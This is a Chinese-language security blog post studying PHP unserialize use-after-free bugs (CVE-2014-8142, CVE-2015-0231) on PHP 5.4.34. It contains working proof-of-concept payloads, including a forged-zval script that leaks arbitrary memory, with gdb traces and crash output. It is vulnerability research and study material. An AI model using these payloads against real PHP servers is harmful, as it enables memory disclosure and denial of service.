@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html>
+
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+<title>PHP中的内存破坏漏洞利用学习(1st)</title>
+<meta name="description" content="A blog about programming and network security">
+
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="stylesheet" href="/css/my_code.css">
+<!-- below font-awesome.css can not be replaced by local file,error will occur -->
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
+
+<link href="https://fonts.googleapis.com/css?family=Great+Vibes" rel="stylesheet">
+
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/favicons/manifest.json">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+<!-- 下面这句是添加在线中文字体:文泉驿等宽正黑 -->
+<!-- <script type="text/javascript" src="//cdn.webfont.youziku.com/wwwroot/js/wf/youziku.api.min.js"></script> -->
+
+
+
+
+
+
+
+<!-- add zoom.js --> 
+<link href="/css/zoom.css" rel="stylesheet">
+<script src="/js/jquery-1.11.0.min.js"></script>
+<script src="/js/zoom.js"></script>
+<script src="/js/transition.js"></script>
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p style="font-family: 'Great Vibes', cursive;">quanyechavshuo</p>
+
+
+    
+    <center style="margin-top:180%">
+    <br>
+    <br>
+    <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
+    <br>
+    <br>
+    </center>
+    <p class="links">
+  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
+      
+
+      <h1 class="header" itemprop="name">PHP中的内存破坏漏洞利用学习(1st)</h1>
+
+      <div class="author">
+        <small><i>
+          
+          on <span itemprop="datePublished" content="2014-08-28">April 19, 2017</span>
+           under 二进制
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          4 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>学习乌云中的&lt;&lt;PHP中的内存破坏漏洞利用&gt;&gt;
+link:http://cb.drops.wiki/drops/papers-4864.html
+cvelink:
+    CVE-2014-8142
+    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8142
+    在PHP之前的ext/standard/var_unserializer.re中的process_nested_data函数中的uaf漏洞[在5.4.36之前,
+    5.5.20之前的5.5.x和5.5.4之前的5.6.x]允许远程攻击者通过一个使用非串行化调用,利用对对象的序列化属性中的重复
+    键的不当处理,这与CVE-2004-1019不同.
+
+    CVE-2015-0231
+    http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0231
+    在PHP之前的ext/standard/var_unserializer.re中的process_nested_data函数中的uaf漏洞[在5.4.37之前,
+    5.5.21之前是5.5.x,5.5.5之前是5.6.x,5.6.5之前]允许远程攻击者通过一个制造的非序列化调用,利用对象序列化属性
+    中重复数字键的不当处理. 注意:由于CVE-2014-8142的修复程序不完整,因此存在此漏洞.
+
+a)看懂此文所需知识
+
+[php垃圾回收理解]
+http://www.cnblogs.com/orlion/p/5350844.html
+http://blog.100dos.com/2017/04/07/php-garbage-collection-collect-cycles/
+
+http://blog.csdn.net/ohmygirl/article/details/41542445
+http://www.cnblogs.com/LittleHann/p/4242535.html
+https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf
+http://blog.nsfocus.net/tech/技术分享/2016/08/08/PHP-unserialize.html
+
+b)理解unserialize
+</code></pre></div></div>
+<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize1.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize2.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize3.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize4.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize5.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize6.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize7.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize8.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize9.png" />
+<img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize10.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c)本文两个难理解的问题
+    1.为什么unserialize后会free内存,具体原理是什么?
+        [http://www.cnblogs.com/orlion/p/5350844.html]
+        A:为了避免每次变量的refcount减少的时候都调用GC的算法进行垃圾判断,此算法会先把所有前面准则3情况下的zval节
+        点放入一个节点(root)缓冲区(root buffer),并且将这些zval节点标记成紫色,同时算法必须确保每一个zval节点在缓冲
+        区中之出现一次.当缓冲区被节点塞满的时候,GC才开始开始对缓冲区中的zval节点进行垃圾判断.
+
+        B:当缓冲区满了之后,算法以深度优先对每一个节点所包含的zval进行减1操作,为了确保不会对同一个zval的refcount重
+        复执行减1操作,一旦zval的refcount减1之后会将zval标记成灰色.需要强调的是,这个步骤中,起初节点zval本身不做减1
+        操作,但是如果节点zval中包含的zval又指向了节点zval(环形引用),那么这个时候需要对节点zval进行减1操作.
+
+        C:算法再次以深度优先判断每一个节点包含的zval的值,如果zval的refcount等于0,那么将其标记成白色(代表垃圾),如
+        果zval的refcount大于0,那么将对此zval以及其包含的zval进行refcount加1操作,这个是对非垃圾的还原操作,同时将这
+        些zval的颜色变成黑色(zval的默认颜色属性)
+
+        D:遍历zval节点,将C中标记成白色的节点zval释放掉.
+
+        &lt;?php
+        $a = array('one');
+        $a[] = &amp;$a;
+        unset($a);
+        ?&gt;
+        比如上面这个变成垃圾的数组$a对应的zval,命名为zval_a,  如果没有执行unset, zval_a的refcount为2,分别由$a
+        和$a中的索引1指向这个zval.  用算法对这个数组中的所有元素(索引0和索引1)的zval的refcount进行减1操作,由于索
+        引1对应的就是zval_a,所以这个时候zval_a的refcount应该变成了1,这样zval_a就不是一个垃圾.如果执行了unset操作,
+        zval_a的refcount就是1,由zval_a中的索引1指向zval_a,用算法对数组中的所有元素(索引0和索引1)的zval的refcount进
+        行减1操作,这样zval_a的refcount就会变成0,于是就发现zval_a是一个垃圾了. 算法就这样发现了顽固的垃圾数据.
+        举了这个例子,读者大概应该能够知道其中的端倪:
+        对于一个包含环形引用的数组,对数组中包含的每个元素的zval进行减1操作,之后如果发现数组自身的zval的refcount变
+        成了0,那么可以判断这个数组是一个垃圾.这个道理其实很简单,假设数组a的refcount等于m, a中有n个元素又指向a,如
+        果m等于n,那么算法的结果是m减n,m-n=0,那么a就是垃圾,如果m&gt;n,那么算法的结果m-n&gt;0,所以a就不是垃圾了m=n代表什么?
+        代表a的refcount都来自数组a自身包含的zval元素,代表a之外没有任何变量指向它,代表用户代码空间中无法再访问到a所
+        对应的zval,代表a是泄漏的内存,因此GC将a这个垃圾回收了.
+
+        更多理解可参考笔者另一篇专门讲解对gc_collect_cycle()的流程的理解的文章:
+        http://3xp10it.cc/web/2017/05/12/php对可能是垃圾的zval的回收过程的理解/
+
+
+        [http://www.freebuf.com/vuls/122938.html]
+        漏洞环境一般不会手工调用gc_collect_cycles(),所以就需要在单一unserialize()调用的情况下完成垃圾回收.
+        在PHP中默认的gc_root_buffer缓冲区大小是100000个(可存放100000个gc_root_buffer),所以只要构造一个超过这个
+        数量元素的数组就可以自动触发gc_collect_cycles().
+        #define GC_ROOT_BUFFER_MAX_ENTRIES 10000
+        下面代码可以自动触发垃圾回收,无需手工调用gc_collect_cycles()
+        define("GC_ROOT_BUFFER_MAX_ENTRIES", 10000);
+        define("NUM_TRIGGER_GC_ELEMENTS", GC_ROOT_BUFFER_MAX_ENTRIES+5);
+        $overflow_gc_buffer = str_repeat('i:0;a:0:{}', NUM_TRIGGER_GC_ELEMENTS);
+        $trigger_gc_serialized_string = 'a:'.(NUM_TRIGGER_GC_ELEMENTS).':{'.$overflow_gc_buffer.'}';
+        unserialize($trigger_gc_serialized_string);
+
+        垃圾分析算法是当发现缓冲区满的时候就立即触发,垃圾分析跟代码执行流是同步过程,也就是只有垃圾分析结束之后,代
+        码才会继续执行.所以在我们的PHP代码中,如果某个unset正好使GC的节点缓冲区满,触发了垃圾分析流程,那么这个unset
+        耗费的时间将比一般的unset多很多.
+
+        个人理解:
+        一般来说,unserialize执行之后系统发现新出现的zval(unserialize产生的zval)可能是垃圾,于是将新出现的zval的信息
+        存入到一个新的gc_root_buffer,这时如果恰好gc_root_buffer的个数超过100000,将触发垃圾分析流程
+
+        !!!然而本文当中并没有利用到unserialize的关于上面的100000大小相关的自动调用gc_collect_cycles()的特点,本
+        文中的unserialize之所以能触发漏洞是因为unserialize后有个重新赋值给["aaa"]的动作,而这个动作相当于
+        unset(["aaa"]),这样会使得["aaa"]所在的zval的refcount=0而导致["aaa"]所在内存被释放.本文中并不是因为发生
+        了gc_root_buffer的个数超过100000而自动的运行gc_collect_cycles()而产生的uaf的漏洞.也即本文与php5.3之后的
+        新的垃圾回收机制无关.
+
+    2.利用zval结构为何可泄露任意内存?
+        nsfocus:(http://blog.nsfocus.net/tech/技术分享/2016/08/08/PHP-unserialize.html)
+        同一个 zval 结构容器,当一个普通 int 类型的 zval 被解释成了 string 类型的 zval 后,这个 zval 的前四个字
+        节会被当成字符指针,而紧接着的四个字节,将会被当成是字符串的长度. 这时如果有一个 Use After Free 的漏洞
+        配合,使用一个 string 类型的 zval 去覆盖一个 int 类型的 zval, 然后使用一个引用去引用之前的zval以重用,这
+        时再使用 var_dump 等方式重新查看这个 zval 时,就会输出那个指针所指向的内存的内容,从而达到了任意地址信息
+        泄露的效果(这里笔者认为这里说错了,应该这样说:使用一个int类型的zval去覆盖一个string类型的zval,然后使用一个
+        引用去引用之前的zval以重用)
+
+d)更多关于PHP内存破坏的学习
+    [php7中的unserialize漏洞利用]
+    https://blog.checkpoint.com/wp-content/uploads/2016/08/Exploiting-PHP-7-unserialize-Report-160829.pdf
+    [fuzz unserialize]
+    https://www.evonide.com/fuzzing-unserialize/
+    [一个很详细的关于php垃圾回收与uaf的漏洞分析]
+    http://www.freebuf.com/vuls/122938.html
+</code></pre></div></div>
+
+<h3 id="0x01-detail">0x01 Detail</h3>
+
+<h4 id="a调试环境">a)调试环境</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali2 x86 
+php5.4.34
+gdb
+</code></pre></div></div>
+
+<h4 id="b环境配置">b)环境配置</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.下载php5.4.34到/root/php5.4.34    
+    下载地址:http://php.net/get/php-5.4.34.tar.gz/from/a/mirror
+    php5.4.34根目录下的.gdbinit是php为了方便被gdb调试,需要在gdb php之后source path/.gdbinit
+        link:https://phpor.net/blog/post/997
+        print_cvs:打印当前执行环境中已编译的PHP变量
+        printzv 0x....:打印指定的PHP变量,需要指定地址
+        zbacktrace:打印PHP函数调用栈
+        print_ft:打印函数表 
+        更多用法参考上面的链接
+
+2.编译php到指定目录
+    kali2.0下:
+    mkdir /usr/bin/ndphp
+    ./configure --prefix=/usr/bin/ndphp
+        如果报xml2-config错误则apt-get install libxml2-dev可解决
+    make
+    make install
+
+3.vi /root/StefanEsser_Original_POC.php
+    -----------start------------
+    &lt;?php
+    for ($i=4; $i&lt;100; $i++) {
+      var_dump($i);
+
+      $m = new StdClass(); 
+      $u = array(1); 
+      $m-&gt;aaa = array(1,2,&amp;$u,4,5);
+
+      $m-&gt;bbb = 1;
+      $m-&gt;ccc = &amp;$u;
+      $m-&gt;ddd = str_repeat("A", $i); 
+      $z = serialize($m);
+      $z = str_replace("bbb", "aaa", $z);
+
+      var_dump($z);
+
+      $y = unserialize($z);
+
+      var_dump($y);
+    }
+    ?&gt;
+    -----------end------------
+
+4.vi /root/StefanEsser_Original_LocalMemLeak.php
+    -----------start------------
+    &lt;?php
+    $data ='O:8:"stdClass":3:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;s:39:"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;}';
+    $x = unserialize($data);
+    var_dump($x);
+    ?&gt;
+    -----------end------------
+5.vi /root/PHPLeak.php
+    -----------start------------
+    &lt;?php
+    $fakezval = pack(
+        'IIII',     //unsigned int
+        0x08048000, //address to leak
+        0x0000000f, //length of string
+        0x00000000, //refcount
+        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
+    );
+    //obj from original POC by @ion1c
+    $obj = 'O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}';
+    $obj=unserialize($obj);
+
+    for($i = 0; $i &lt; 5; $i++) { //this i value is larger than usually required
+        $v[$i]=$fakezval.$i; //repeat to overwrite
+    }
+    //due to the reference being overwritten by our loop above, leak memory
+    echo $obj-&gt;ccc;
+    ?&gt;
+    -----------end------------
+</code></pre></div></div>
+
+<h4 id="c调试">c)调试</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>测试StefanEsser_Original_POC.php是否会导致php解释器出问题
+    └&gt; /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php 
+    int(4)
+    string(134) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}"
+    object(stdClass)#2 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(4) "AAAA"
+    }
+    int(5)
+    string(135) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:5:"AAAAA";}"
+    object(stdClass)#1 (3) {
+      ["aaa"]=&gt;
+      int(-1254177400)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(5) "AAAAA"
+    }
+    int(6)
+    string(136) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:6:"AAAAAA";}"
+    object(stdClass)#3 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(6) "AAAAAA"
+    }
+    int(7)
+    string(137) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:7:"AAAAAAA";}"
+    object(stdClass)#2 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(7) "AAAAAAA"
+    }
+    int(8)
+    string(138) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:8:"AAAAAAAA";}"
+    object(stdClass)#1 (3) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;NULL
+      ["ddd"]=&gt;
+      string(8) "AAAAAAAA"
+    }
+    int(9)
+    string(139) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:9:"AAAAAAAAA";}"
+    [1]    2141 segmentation fault  /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php
+
+    果然出现segmentation fault
+
+动态调试php
+    └&gt; gdb /usr/bin/ndphp/bin/php
+    GNU gdb (Debian 7.11.1-2) 7.11.1
+    Copyright (C) 2016 Free Software Foundation, Inc.
+    License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+    This is free software: you are free to change and redistribute it.
+    There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+    and "show warranty" for details.
+    This GDB was configured as "x86_64-linux-gnu".
+    Type "show configuration" for configuration details.
+    For bug reporting instructions, please see:
+    &lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+    Find the GDB manual and other documentation resources online at:
+    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+    For help, type "help".
+    Type "apropos word" to search for commands related to "word"...
+    Reading symbols from /usr/bin/ndphp/bin/php...done.
+
+    [加载php根目录下的.gdbinit]
+    source /root/php-5.4.34/.gdbinit
+
+    [下断点]
+    (gdb) b var_unserializer.c:337
+
+    [运行StefanEsser_Original_LocalMemLeak.php]
+    r StefanEsser_Original_LocalMemLeak.php
+
+    [第一次命中]
+    Starting program: /usr/bin/ndphp/bin/php StefanEsser_Original_LocalMemLeak.php
+    [Thread debugging using libthread_db enabled]
+    Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+
+    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa "", var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=2, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
+    337                             convert_to_string(key);
+
+    [跳过第一次命中后又发生了第二次命中]
+    (gdb) c
+    Continuing.
+
+    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa "", var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=1, objprops=1, rval=0xbfffbc64) at /root/php-5.4.34/ext/standard/var_unserializer.c:337
+    337                             convert_to_string(key);
+
+    [执行print *(var_entries*)var_hash-&gt;first][乌云上的原文说的执行printzv *(var_entries)var_hash-&gt;first有误]
+    (gdb) print *(var_entries*)var_hash-&gt;first
+    $1 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &lt;repeats 1016 times&gt;}, used_slots = 8, next = 0x0}
+    可看出data变量是个数组,数组里面的内容是地址,这些地址指向unserialize函数解析的变量值,关注第5个0xb5c6f1c0(php
+    代码中用的是R:5).
+    unserialize函数解析的变量值分别为下面的各个zval的内存地址:
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/zval1.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    上图中蓝色是符号,红色是zval的属性,绿色是zval的值
+    查看这个地址中的内容:
+
+    [printzv 0xb5c6f1c0]
+    (gdb) printzv 0xb5c6f1c0
+    [0xb5c6f1c0] (refcount=1) string(39): "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+
+    [步过断点继续运行]
+    (gdb) n
+    338                             zend_hash_update(ht, Z_STRVAL_P(key), Z_STRLEN_P(key) + 1, &amp;data,
+    这里的zend_hash_update为可疑函数
+    
+    步过该可疑函数并查看刚才地址0xb5c6f1c0中出现了什么内容
+    (gdb) n
+    342                     zval_dtor(key);
+    (gdb) printzv 0xb5c6f1c0
+    [0xb5c6f1c0] (refcount=0) string(39): "\35\0\0\0-\0\0\0\0\37777777761\37777777706\37777777665\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0-\0\0\0\35\0\0\0D\37777777761\37777777706"
+    笔者认为:
+    这里步过zend_hash_update之后将导致["aaa"]变量由array(5)[1,2,"AAA..A",4,5]变成int(1),这样的话相当于一个
+    unset(["aaa"])操作,[1,2,"AAA..A",4,5]这个zval由于原来的["aaa"]符号被unset了,导致原来的["aaa"]符号对应的
+    [1,2,"AAA..A",4,5]这个zval的refcount变成0,使得[1,2,"AAA..A",4,5]这个zval被释放,这个被释放的zval的内存的位置
+    将被用来存储新的变量的内容,所以这里看到的printzv 0xb5c6f1c0的结果不再是string(39): "AAAAA...A"了,(暂时不理解
+    为什么是上面显示的杂乱的数据)
+
+    还要确认下该地址是不是还在var_hash表中,然后继续运行
+    (gdb) print *(var_entries*)var_hash-&gt;first
+    $3 = {data = {0xb5c6e9e0, 0xb5c6f9f4, 0xb5c6f108, 0xb5c6f178, 0xb5c6f1c0, 0xb5c6f238, 0xb5c6f280, 0xb5c6f0ec, 0x0 &lt;repeats 1016 times&gt;}, used_slots = 8, next = 0x0}
+    发现还在
+
+    (gdb) c
+    Continuing.
+
+    Breakpoint 1, process_nested_data (p=p@entry=0xbfffbc48, max=max@entry=0xb5b65cfa "", var_hash=var_hash@entry=0xbfffbc4c, ht=0xb5c6f9c4, elements=0, objprops=1, rval=0xbfffbc64)
+        at /root/php-5.4.34/ext/standard/var_unserializer.c:337
+    337                             convert_to_string(key);
+    (gdb) c
+    Continuing.
+    object(stdClass)#1 (2) {
+      ["aaa"]=&gt;
+      int(1)
+      ["ccc"]=&gt;
+      &amp;string(39) "--D"
+    }
+    [Inferior 1 (process 1725) exited normally]
+    这里不知为何["ccc"]对应的zval的值变成--D了
+    (gdb)quit
+
+    现在尝试通过一个string类型的zval覆盖["aaa"]符号对应的原来占据的array类型的zval值的空间,也即占据下面图中的
+    array(5)[1,2,array(1),4,5] 这个zval所在的内存的空间
+    运行/usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
+
+    ---------PHPLeak.php------------
+    &lt;?php
+    $fakezval = pack(
+        'IIII',     //unsigned int
+        0x08048000, //address to leak
+        0x0000000f, //length of string
+        0x00000000, //refcount
+        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
+    );
+    //obj from original POC by @ion1c
+    $obj = 'O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}';
+    $obj=unserialize($obj);
+
+    for($i = 0; $i &lt; 5; $i++) { //this i value is larger than usually required
+        $v[$i]=$fakezval.$i; //repeat to overwrite
+    }
+    //due to the reference being overwritten by our loop above, leak memory
+    echo $obj-&gt;ccc;
+    ?&gt;
+    ---------PHPLeak.php------------
+
+    对应zval图如下:
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/zval2.png" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    output:
+    $ /usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
+    0000000 177   E   L   F 001 001 001  \0  \0  \0  \0  \0  \0  \0  \0
+    000000f
+    [1]    2195 segmentation fault  /usr/bin/ndphp/bin/php PHPLeak.php |
+           2197 done                hexdump -c
+    这里说明可成功泄露指定地址指定长度的内存内容
+
+</code></pre></div></div>
+</span>
+
+        
+
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            php, 漏洞利用, 二进制
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+
+
+<!-- 个人增加织网背景效果 -->
+<!--
+<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+-->
+
+
+      
+
+
+
+      
+
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-12">
+		  <!--for better experience please install font 文泉驿等宽正黑-->
+Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
+	<SCRIPT language=javascript> 
+	<!-- 
+	function show_date_time(){ 
+		window.setTimeout("show_date_time()", 1000); 
+		BirthDay=new Date("3/7/2016 20:00:00");
+		today=new Date(); 
+		timeold=(today.getTime() - BirthDay.getTime()); 
+		sectimeold=timeold/1000 
+		secondsold=Math.floor(sectimeold); 
+		msPerDay=24*60*60*1000 
+		e_daysold=timeold/msPerDay 
+		daysold=Math.floor(e_daysold); 
+		e_hrsold=(e_daysold-daysold)*24; 
+		hrsold=Math.floor(e_hrsold); 
+		e_minsold=(e_hrsold-hrsold)*60; 
+		minsold=Math.floor((e_hrsold-hrsold)*60); 
+		seconds=Math.floor((e_minsold-minsold)*60); 
+		//times = document.getElementById("times");
+		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
+	} 
+	show_date_time(); 
+	//--> 
+	</SCRIPT>
+  </div>
+</div>
+
+<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
+<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
+<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
+<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
+<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>
+
+
+<script src="/js/jquery-1.11.0.min.js"></script>
+<!--
+<script src="/js/bootstrap.min.js"></script>
+-->
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+<!--
+<script type="text/javascript"> 
+$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
+$youziku.draw(); 
+</script>
+-->
+
+
+    </body>
+</html>
